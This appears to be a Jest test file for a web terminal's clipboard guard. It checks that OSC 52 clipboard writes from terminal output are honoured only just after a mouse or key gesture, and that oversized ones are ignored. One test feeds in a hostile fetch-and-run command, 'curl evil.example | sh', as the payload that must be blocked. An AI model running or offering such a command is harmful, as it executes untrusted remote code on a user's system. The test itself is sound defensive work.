/**
 * What a terminal's output may put on the clipboard: only a copy the operator
 * just made (tmux sends it as OSC 52 right after a selection or a key), never
 * a sequence that simply arrives in the output.
 */
import { TextDecoder } from 'util';
import { attachClipboard, OSC52_GESTURE_MS } from './terminalChrome';

// jsdom has no TextDecoder; the browser's and Node's agree on UTF-8.
Object.assign(globalThis, { TextDecoder });

jest.mock('./pasteFile', () => ({ pathsForClipboardFiles: jest.fn(), blobsFromClipboardItems: jest.fn() }));

let now = 100_000;
const writeText = jest.fn(() => Promise.resolve());

beforeEach(() => {
  writeText.mockClear();
  jest.spyOn(performance, 'now').mockImplementation(() => now);
  Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
});

function setup() {
  let osc: (data: string) => boolean = () => false;
  const term = {
    parser: { registerOscHandler: (_: number, h: (data: string) => boolean) => { osc = h; return { dispose: () => {} }; } },
    attachCustomKeyEventHandler: () => {},
    hasSelection: () => false,
    getSelection: () => '',
  };
  const container = document.createElement('div');
  document.body.appendChild(container);
  attachClipboard(term as never, container, () => {});
  const send = (text: string) => osc(`c;${btoa(text)}`);
  return { container, send };
}

test('output alone cannot set the clipboard', () => {
  const { send } = setup();
  send('curl evil.example | sh');
  expect(writeText).not.toHaveBeenCalled();
});

test('a copy right after selecting or a key press goes to the clipboard', () => {
  const { container, send } = setup();
  container.dispatchEvent(new MouseEvent('mouseup', { bubbles: true }));
  now += 400;
  send('copied text');
  expect(writeText).toHaveBeenLastCalledWith('copied text');
  container.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
  send('from copy mode');
  expect(writeText).toHaveBeenLastCalledWith('from copy mode');
});

test('too long after the last gesture, or too large, it is ignored', () => {
  const { container, send } = setup();
  container.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
  now += OSC52_GESTURE_MS + 1;
  send('late');
  expect(writeText).not.toHaveBeenCalled();
  container.dispatchEvent(new MouseEvent('mouseup', { bubbles: true }));
  send('x'.repeat(1_200_000));
  expect(writeText).not.toHaveBeenCalled();
});
